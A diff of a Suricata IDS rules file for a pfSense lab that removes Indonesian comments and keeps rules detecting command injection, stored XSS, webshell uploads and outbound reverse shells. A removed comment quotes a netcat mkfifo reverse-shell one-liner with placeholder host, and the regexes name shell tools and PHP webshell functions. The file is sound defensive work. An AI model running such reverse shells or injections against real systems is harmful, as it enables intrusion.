@@ -1,96 +1,15 @@
-# Suricata custom trigger rules — pfSense (interface LAN1)
-# Tujuan: nutup gap ET Open ruleset yang gak match skenario spesifik lab Command Injection
-# (attacker non-root/www-data, dan reverse shell LOLBin mkfifo+nc)
-# Referensi: Labs/web-server-attack/command-injection/README.md, Infrastructure/pfsense-suricata-setup.md
-
-# 2026-07-17 — Deteksi dari sisi RESPONSE (setelah command dieksekusi).
-# ET Open default (GPL ATTACK_RESPONSE id check returned root) cuma nyari uid=0(root),
-# gak match kalau attacker cuma dapet shell non-root (www-data, uid=33) - kasus paling umum
-# di command injection lewat web app. Rule ini generic: nyari pola output command `id`
-# (uid=...gid=...) di HTTP response, independen dari privilege level.
 alert http any any -> any any (msg:"LOCAL LOLBin - id command output reflected in HTTP response"; flow:established,to_client; file_data; content:"uid="; content:"gid="; distance:0; within:60; classtype:successful-recon-limited; sid:1000001; rev:1;)
 
-# 2026-07-17 — Deteksi dari sisi REQUEST (sebelum command dieksekusi, lebih preventif).
-# Nyari separator command injection (;, |, ||, &&, backtick, $, newline) yang diikutin
-# nama command/tool yang sering dipake buat LOLBin/reverse shell.
-#
-# Gotcha yang ketemu pas bikin rule ini:
-# 1. Form HTML standar (application/x-www-form-urlencoded) otomatis URL-encode karakter
-#    spesial pas submit — `;` jadi `%3b`, `|` jadi `%7c`, dst. Rule harus nyakup DUA-DUANYA
-#    (literal DAN encoded), gak cukup nyari karakter literal doang.
-# 2. Karakter `;` literal DI DALAM string pcre bikin parser Suricata salah paham nganggep
-#    itu penutup option (soalnya `;` emang separator option di syntax rule Suricata) —
-#    wajib di-escape jadi `\;` biar kebaca sebagai bagian dari regex, bukan separator.
 alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:"Detect Command Injection separators in POST Body"; flow: established,to_server; http.method; content: "POST"; http.request_body; pcre:"/(?:\;|%3b|\||%7c|\||&&|%26%26|`|%60|\$|%24|\n|%0a)\s*(?:ping|wget|curl|nc|bash|sh|php|python|perl|whoami|ls|id|mkfifo)/i"; classtype: web-application-attack; sid:1000003; rev:1;)
 
-# 2026-07-21 — Deteksi Stored XSS (lab Labs/web-server-attack/xss/stored/README.md).
-# Nutup gap yang sama kayak Command Injection: ET Open gak match payload spesifik lab ini.
-# Scope ke field guestbook DVWA (`txtName`, `mtxMessage`) biar gak asal match `<script`
-# di semua traffic HTTP_SERVERS.
-#
-# Gotcha yang sama kayak rule 1000003: form application/x-www-form-urlencoded otomatis
-# encode `<` jadi `%3C` pas submit browser normal — rule harus nyakup literal DAN encoded.
-#
-# Catatan: rule ini cuma nutup momen INJEKSI (submit payload dari attacker, request POST
-# masih ada string payload-nya). Momen REPLAY (visitor lain buka halaman guestbook tanpa
-# ngirim payload apapun di request mereka) gak bisa ketutup rule network-layer apapun —
-# payload-nya udah "menyatu" di response body DB, bukan di request. Lihat hipotesis di
-# README stored XSS.
 alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:"Detect Stored XSS payload in POST Body (DVWA guestbook txtName/mtxMessage)"; flow: established,to_server; http.method; content: "POST"; http.request_body; pcre:"/(?:txtName|mtxMessage)=[^&]*(?:<|%3[Cc])\s*(?:script|img|svg|iframe)/i"; classtype: web-application-attack; sid:1000004; rev:1;)
 
-# 2026-08-04 — Deteksi EGRESS (lab Labs/web-server-attack/full-attack-chain/README.md,
-# Analisis Insiden Event 2 & 5): payload C2 (`payload.php`) dan exploit privesc
-# (`exploit_pedit`) di-fetch attacker via `wget` dari webshell — request KELUAR dari
-# Web-Server menuju attacker host di luar firewall. Semua rule di atas (1000001/1000003/
-# 1000004) cuma nangkep arah MASUK ($EXTERNAL_NET -> $HTTP_SERVERS); arah keluar ini
-# luput total sebelumnya.
-#
-# DVWA gak punya alasan bisnis apapun buat inisiasi HTTP request keluar ke internet,
-# jadi rule ini sengaja dibikin broad (semua GET dari $HTTP_SERVERS ke $EXTERNAL_NET,
-# gak dipersempit ke path/payload tertentu) — base rate false-positive-nya harusnya
-# nyaris nol di environment lab ini karena servernya emang gak pernah punya trafik keluar.
 alert http $HTTP_SERVERS any -> $EXTERNAL_NET any (msg:"LOCAL Outbound HTTP request from web server to external host - possible C2 payload staging"; flow:established,to_server; http.method; content:"GET"; classtype:trojan-activity; sid:1000005; rev:1;)
 
-# 2026-08-04 — Deteksi WEBSHELL UPLOAD in-transit (lab Labs/web-server-attack/file-upload/
-# README.md, section Verifikasi Hipotesis #3): Suricata confirmed BUTA total selama upload
-# b374k lewat multipart/form-data — rule 1000003 scope-nya command injection separator,
-# gak pernah nyentuh vektor file upload. Ini nutup gap itu.
-#
-# Sengaja dipisah 2 rule beda confidence level:
-# 1. Berbasis EKSTENSI FILE (filename=".....php" dkk di Content-Disposition) — ini sinyal
-#    paling robust karena gak bisa disembunyiin apapun packer/obfuscator, DVWA butuh
-#    ekstensi eksekutabel biar RCE-nya jalan. Base rule, selalu jalan duluan.
-# 2. Berbasis SIGNATURE FUNGSI PHP umum (eval/system/shell_exec/dst) — best-effort, cuma
-#    match kalau isi shell-nya PLAINTEXT/gak di-obfuscate. b374k yang dipake di lab File
-#    Upload lewat proses "packer" dulu sebelum diupload (lihat asset/packer.png), jadi
-#    kemungkinan besar rule ini MISS buat shell itu spesifik — tetep dipertahankan sebagai
-#    layer tambahan buat webshell lain yang gak di-obfuscate.
 alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:"LOCAL Executable file extension in multipart upload - possible webshell"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"filename="; pcre:"/filename=\x22[^\x22]*\.(php[0-9]?|phtml|phar|pht)\x22/i"; classtype:web-application-attack; sid:1000006; rev:1;)
 
 alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:"LOCAL Common webshell function signature in unobfuscated multipart upload body"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"filename="; pcre:"/\.(php[0-9]?|phtml|phar|pht)\x22/i"; pcre:"/(eval\s*\(|system\s*\(|shell_exec\s*\(|passthru\s*\(|base64_decode\s*\(|proc_open\s*\()/i"; classtype:web-application-attack; sid:1000007; rev:1;)
 
-# 2026-08-04 — Deteksi RAW TCP REVERSE SHELL (bukan HTTP-based kayak rule 1000005).
-# Lab Command Injection pakai pola `mkfifo /tmp/f; nc IP PORT < /tmp/f | /bin/sh` — reverse
-# shell netcat murni, bukan trafik HTTP sama sekali. Rule 1000001/1000005 di atas sama-sama
-# scope ke `alert http`, jadi buta total terhadap pola ini. Rule TCP generic ini nutup gap-nya:
-# web server (yang seharusnya cuma nerima trafik masuk di port web) tiba-tiba bikin koneksi
-# KELUAR ke port non-web — sinyal kuat protocol-agnostic buat reverse shell klasik, independen
-# dari tool yang dipakai attacker (nc, ncat, socat, bash /dev/tcp, dst).
-# `threshold` dipasang biar gak flood satu alert per paket sepanjang sesi shell interaktif
-# yang bisa berjam-jam — cukup 1 alert per source per 5 menit buat kasih sinyal ke analyst.
 alert tcp $HTTP_SERVERS any -> $EXTERNAL_NET !$HTTP_PORTS (msg:"LOCAL Outbound TCP connection from web server to external host on non-web port - possible raw reverse shell"; flow:to_server,established; threshold:type limit, track by_src, count 1, seconds 300; classtype:trojan-activity; sid:1000008; rev:1;)
 
-# 2026-08-06 — Exception buat false positive di rule 1000008 (lab Full Attack Chain,
-# setup n8n alerting pipeline): rule 1000008 nangkep SEMUA koneksi TCP keluar dari
-# Web-Server ke port non-web di luar $HOME_NET — termasuk trafik LEGIT Wazuh Agent
-# (Web-Server) -> Wazuh Manager (Dell) di port 1514/1515, karena Dell posisinya di
-# luar pfSense (di luar $HOME_NET, otomatis kehitung $EXTERNAL_NET).
-#
-# `pass` diproses dengan prioritas di atas `alert` buat packet yang sama (independen
-# dari urutan rule di file ini) — jadi trafik yang match rule ini gak bakal ke-alert
-# lagi sama rule 1000008 di atas, walau posisinya duluan.
-#
-# $SIEM_HOST didefinisikan di pfSense (Services > Suricata > Interfaces > LAN1 >
-# Variables), BUKAN hardcode IP Dell literal di sini — konsisten sama pola
-# $HTTP_SERVERS/$EXTERNAL_NET yang juga resolve dari luar file rule.
 pass tcp $HTTP_SERVERS any -> $SIEM_HOST [1514,1515] (msg:"PASS Wazuh agent to manager traffic - known good egress"; flow:to_server,established; sid:1000009; rev:1;)
